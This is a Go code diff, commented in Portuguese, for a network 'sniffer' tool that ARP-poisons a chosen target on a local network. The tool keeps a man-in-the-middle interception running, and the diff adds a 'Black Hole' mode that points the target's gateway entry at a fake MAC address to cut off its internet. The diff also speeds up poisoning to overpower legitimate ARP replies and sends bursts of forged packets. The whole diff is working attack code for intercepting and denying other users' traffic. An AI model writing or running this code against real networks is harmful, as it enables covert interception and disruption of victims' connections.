@@ -104,19 +104,23 @@ func (s *SnifferService) MonitorTarget(
 		"darkweb", "torrent-proxy", "crack", "hack-tool",
 	}
 
-	// Goroutine 1: Envenenamento ARP contínuo (mantém o MitM ativo)
+	// Goroutine 1: Envenenamento ARP contínuo (mantém o MitM ou Black Hole ativo)
 	go func() {
 		for {
 			select {
 			case <-ctx.Done():
 				return
 			default:
-				if !blocked {
-					// Mantém o MitM ativo: envia ARPs forjados
+				if blocked {
+					// MODO BLOQUEIO TOTAL: envia ARPs apontando gateway para MAC inexistente (Black Hole)
+					// O alvo envia frames para de:ad:be:ef:00:01, que não existe → switch descarta tudo
+					_ = s.SendARPBlackhole(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayIP)
+				} else {
+					// MODO MitM NORMAL: aponta gateway para nosso MAC (interceptação com forwarding)
 					_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
 					_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
 				}
-				time.Sleep(1500 * time.Millisecond)
+				time.Sleep(500 * time.Millisecond) // Intervalo mais agressivo para vencer ARPs legítimos
 			}
 		}
 	}()
@@ -137,36 +141,50 @@ func (s *SnifferService) MonitorTarget(
 						monLog.BlockReason = "Bloqueio manual pelo operador"
 					}
 
-					// DESATIVA IP Forwarding → o tráfego do alvo não é mais encaminhado
+					// DESATIVA IP Forwarding (camada extra de segurança)
 					_ = disableIPForwardingErr()
 
-					fmt.Printf("\n  %s[🛑 BLOQUEIO ATIVO]%s WiFi do alvo %s foi NEGADO.\n", "\033[31m", "\033[0m", targetIP)
-					fmt.Printf("  %s    → Tráfego interceptado, mas NÃO encaminhado. Alvo sem acesso à internet.%s\n", "\033[33m", "\033[0m")
+					// Envia rajada de ARPs Black Hole para envenenar o cache imediatamente
+					for i := 0; i < 10; i++ {
+						_ = s.SendARPBlackhole(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayIP)
+						time.Sleep(50 * time.Millisecond)
+					}
+
+					fmt.Printf("\n  %s[🛑 BLOQUEIO TOTAL ATIVO]%s WiFi do alvo %s foi NEGADO.%s\n", "\033[31m", "\033[0m", targetIP, "\033[0m")
+					fmt.Printf("  %s    → Técnica: ARP Black Hole (MAC inexistente de:ad:be:ef:00:01)%s\n", "\033[33m", "\033[0m")
+					fmt.Printf("  %s    → Tráfego do alvo é descartado pelo switch. Bloqueio 100%% efetivo.%s\n", "\033[33m", "\033[0m")
 
 					monLog.Events = append(monLog.Events, MonitorEvent{
 						Timestamp: time.Now(),
 						Type:      "BLOCK",
 						Source:    "OPERADOR",
-						Detail:    "WiFi NEGADO - IP Forwarding desativado",
+						Detail:    "WiFi NEGADO - ARP Black Hole ativo (MAC de:ad:be:ef:00:01)",
 					})
 
 					if alertCh != nil {
-						alertCh <- fmt.Sprintf("[BLOCK] WiFi negado para %s", targetIP)
+						alertCh <- fmt.Sprintf("[BLOCK] WiFi negado para %s (Black Hole)", targetIP)
 					}
 
 				} else if !shouldBlock && blocked {
 					blocked = false
 
-					// REATIVA IP Forwarding → tráfego volta a fluir
+					// REATIVA IP Forwarding
 					_ = enableIPForwarding()
 
-					fmt.Printf("\n  %s[✓ DESBLOQUEIO]%s WiFi do alvo %s foi RESTAURADO.\n", "\033[32m", "\033[0m", targetIP)
+					// Envia rajada de ARPs restaurando nosso MAC para retomar o MitM
+					for i := 0; i < 10; i++ {
+						s.SendARPRestore(poisonHandle, myMAC, targetMAC, net.ParseIP(targetIP), gatewayIP)
+						_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
+						time.Sleep(50 * time.Millisecond)
+					}
+
+					fmt.Printf("\n  %s[✓ DESBLOQUEIO]%s WiFi do alvo %s foi RESTAURADO.%s\n", "\033[32m", "\033[0m", targetIP, "\033[0m")
 
 					monLog.Events = append(monLog.Events, MonitorEvent{
 						Timestamp: time.Now(),
 						Type:      "UNBLOCK",
 						Source:    "OPERADOR",
-						Detail:    "WiFi RESTAURADO - IP Forwarding reativado",
+						Detail:    "WiFi RESTAURADO - MitM reativado com nosso MAC",
 					})
 				}
 				mu.Unlock()
